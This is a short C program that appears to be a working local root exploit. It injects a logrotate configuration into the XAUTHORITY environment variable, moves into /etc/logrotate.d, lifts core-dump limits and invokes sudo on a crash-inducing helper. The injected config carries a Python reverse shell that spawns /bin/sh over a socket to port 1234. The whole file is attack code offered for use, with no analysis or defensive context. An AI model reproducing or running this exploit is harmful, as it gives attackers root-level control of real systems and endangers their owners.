#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <libgen.h>
#include <limits.h>

static const char *get_gen_core_path()
{
    static char buf[PATH_MAX+1];
    char path[PATH_MAX+1];

    const ssize_t n = readlink("/proc/self/exe", path, PATH_MAX);
    if (n < 0) {
        perror("readlink");
        return NULL;
    }

    path[n] = '\0';
    strncpy(buf, dirname(path), PATH_MAX);
    buf[PATH_MAX] = '\0';
    strncat(buf, "/gen-core", PATH_MAX);

    return buf;
}

int main(int argc, char **argv, char **envp)
{
	char * const nargv[] = {"sudo", (char *const) get_gen_core_path(), NULL};
	struct rlimit lim;

	if (!nargv[1])
	    return EXIT_FAILURE;

	const char *xauth_env = "\n/var/crash/test.log{\n su root root\n daily\n size=0\n"
		"firstaction\n /usr/bin/python3 -c \"import sys,socket,os,pty;"
		"s=socket.socket();s.connect(('127.0.0.1', 1234));[os.dup2(s.fileno(), fd)"
		"for fd in (0,1,2)]; pty.spawn('/bin/sh')\";\n endscript\n}\n\nA\"";

	setenv("XAUTHORITY", xauth_env, 1);
	chdir("/etc/logrotate.d");

	lim.rlim_cur = RLIM_INFINITY;
	lim.rlim_max = RLIM_INFINITY;
	setrlimit(RLIMIT_CPU, &lim);
	lim.rlim_cur = RLIM_INFINITY;
	lim.rlim_max = RLIM_INFINITY;
	setrlimit(RLIMIT_CORE, &lim);

	execve("/usr/bin/sudo", nargv, envp);
	perror("execve");
	return EXIT_FAILURE;
}
